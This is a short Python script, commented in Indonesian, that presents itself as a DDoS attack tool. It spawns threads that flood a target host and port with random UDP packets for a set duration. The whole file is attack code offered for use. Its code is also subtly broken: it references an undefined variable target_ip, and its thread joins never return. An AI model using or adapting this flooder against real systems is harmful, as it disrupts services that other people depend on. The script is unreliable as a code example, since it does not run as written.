import random
import threading
import time
import socket

target_url = "target.com"
target_port = 80
num_threads = 10  # Jumlah thread
duration = 30  # Jumlah detik

print(f"Target IP: {target_url}")
print(f"Target Port: {target_port}")
print(f"Jumlah Thread: {num_threads}")
print(f"Jumlah Detik: {duration}")

bytes = random._urandom(1024)

def ddos():
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes, (target_ip, target_port))

# Membuat thread untuk melakukan serangan DDoS
threads = []
for i in range(num_threads):
    t = threading.Thread(target=ddos)
    threads.append(t)
    t.start()

# Menunggu durasi penyerangan
time.sleep(duration)

# Menghentikan semua thread
for thread in threads:
    thread.join()

print("Penyerangan selesai")
